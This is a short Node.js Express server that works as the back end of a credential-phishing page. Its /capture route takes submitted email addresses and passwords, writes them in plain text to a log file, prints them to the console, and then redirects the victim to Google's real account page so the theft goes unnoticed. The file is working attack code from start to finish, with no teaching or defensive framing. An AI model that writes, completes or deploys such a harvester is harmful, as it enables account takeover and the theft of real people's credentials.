const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

app.post("/capture", (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).send("Missing fields");
  }

  const log = `Email: ${email}, Password: ${password}\n`;
  const logPath = path.join(__dirname, "log.txt");

  try {
    fs.appendFileSync(logPath, log, "utf8");
    console.log("Captured:", email, password);
  } catch (err) {
    console.error("Failed to write log:", err);
  }

  res.redirect("https://myaccount.google.com/");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
